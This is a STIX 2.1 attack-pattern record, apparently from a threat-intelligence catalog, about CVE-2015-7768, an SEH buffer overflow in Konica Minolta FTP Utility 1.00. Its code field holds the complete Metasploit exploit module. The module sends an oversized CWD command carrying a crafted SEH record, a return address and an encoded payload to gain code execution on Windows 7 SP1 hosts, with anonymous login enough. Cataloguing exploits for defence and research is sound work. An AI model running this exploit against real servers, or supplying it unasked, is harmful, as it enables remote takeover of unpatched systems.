{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9946f1f1-aefe-452a-af6b-5dce37bd683b",
    "created": "2024-08-14T16:51:06.828277Z",
    "modified": "2024-08-14T16:51:06.828281Z",
    "name": "Konica Minolta FTP Utility 1.00 Post Auth CWD Command SEH Overflow",
    "description": " This module exploits an SEH overflow in Konica Minolta FTP Server 1.00. Konica Minolta FTP fails to check input size when parsing 'CWD' commands, which leads to an SEH overflow.  Konica FTP allows anonymous access by default; valid credentials are typically unnecessary to exploit this vulnerability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/kmftp_utility_cwd.rb",
            "external_id": "kmftp_utility_cwd.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-7768"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Konica Minolta FTP Utility 1.00 Post Auth CWD Command SEH Overflow',\n      'Description' => %q{\n          This module exploits an SEH overflow in Konica Minolta FTP Server 1.00.\n        Konica Minolta FTP fails to check input size when parsing 'CWD' commands, which\n        leads to an SEH overflow.  Konica FTP allows anonymous access by default; valid\n        credentials are typically unnecessary to exploit this vulnerability.\n      },\n      'Author' =>\n        [\n          'Shankar Damodaran', # stack buffer overflow dos p.o.c\n          'Muhamad Fadzil Ramli <mind1355[at]gmail.com>' # seh overflow, metasploit module\n        ],\n      'License' => MSF_LICENSE,\n      'Notes' => {\n        'Stability' => [],\n        'SideEffects' => [],\n        'Reliability' => []\n      },\n      'References' =>\n        [\n          [ 'CVE', '2015-7768' ],\n          [ 'EDB', '37908' ]\n        ],\n      'Privileged' => false,\n      'Payload' =>\n        {\n          'Space' => 1500,\n          'BadChars' => \"\\x00\\x0a\\x2f\\x5c\",\n          'DisableNops' => true\n        },\n      'Platform' => 'win',\n      'Targets' =>\n        [\n          [\n            'Windows 7 SP1 x86',\n            {\n              'Ret' => 0x12206d9d, # ppr - KMFtpCM.dll\n              'Offset' => 1037\n            }\n          ]\n        ],\n      'DisclosureDate' => '2015-08-23',\n      'DefaultTarget' => 0))\n  end\n\n  def check\n    connect\n    disconnect\n\n    if banner =~ /FTP Utility FTP server \\(Version 1\\.00\\)/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    connect_login\n\n    buf = rand_text(target['Offset'])\n    buf << generate_seh_record(target.ret)\n    buf << payload.encoded\n    buf << rand_text(3000)\n\n    print_status(\"Sending exploit buffer...\")\n    send_cmd(['CWD', buf], false) # this will automatically put a space between 'CWD' and our attack string\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-08-23",
    "x_mitre_platforms": [
        "win'"
    ]
}